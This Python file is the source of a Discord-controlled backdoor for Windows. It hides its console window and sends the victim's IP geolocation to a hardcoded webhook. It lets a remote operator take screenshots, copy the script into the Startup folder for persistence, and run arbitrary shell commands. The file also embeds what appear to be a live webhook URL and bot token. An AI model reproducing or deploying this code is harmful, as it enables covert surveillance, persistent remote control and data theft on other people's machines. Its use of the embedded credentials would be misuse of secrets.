# discord bot backdoor: screenshot cmd, upload cmd, shell cmd, startup cmd <---- We gonna add these #

import discord
from discord import member
from discord import message
from discord.ext import commands
import pyautogui
import os
import ctypes, win32process
import threading
import requests

WEBHOOK = "https://discordapp.com/api/webhooks/1078810667928268891/_EKw0pW3GvIsa311Pbri1MtW4JirjUPp1xpiT-T47pqfjcLbbT8UHEVNfFdKDDEmgG0H" 


bot = commands.Bot(command_prefix=',', intents=discord.Intents.all())

username = os.getlogin()
startup_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

def HMA():
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd != 0:
        ctypes.windll.user32.ShowWindow(hwnd, 0)
        ctypes.windll.kernel32.CloseHandle(hwnd)
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
HMA()


def get_ipv4():
  r = requests.get(f'https://geolocation-db.com/json')
  return r.text

def to_hook(content, url):
  requests.post(url, json={'content': content})

@bot.event
async def on_ready():
  ip_info = get_ipv4()

  to_hook(f"@everyone {ip_info}", WEBHOOK)

  print(bot.user, "is online")

# - - - - SCREEN SHOT - - - - #

@bot.command()
async def s(ctx):
  ss = pyautogui.screenshot() # new ss every time someone does $ss
  ss.save("ss.png")

  await ctx.reply(file=discord.File("ss.png"))

# - - - - START UP - - - #

@bot.command()
async def startup(ctx):
  with open(__file__, "r") as f:
    contents = f.read() # read our own file

  with open(startup_path + "startup.py", "w") as f:
    f.write(contents) # write contents into new file in startup folder

  await ctx.reply("added file to startup!")

# - - - - SHELL - - - - #

@bot.command()
async def shell(ctx):
  cmd = ctx.message.content[7:]

  threading.Thread(target=os.system, args=(cmd,)).start()

  await ctx.reply("executed shell thread!")

# - - - - RUN BOT - - - - #

bot.run('MTA3ODgxMjQ1MTA1NjkxMDQ0Ng.GM4KSH.323rhbhJIqfyhpCuO8of4JzJ0_V-oPssCMOyvU')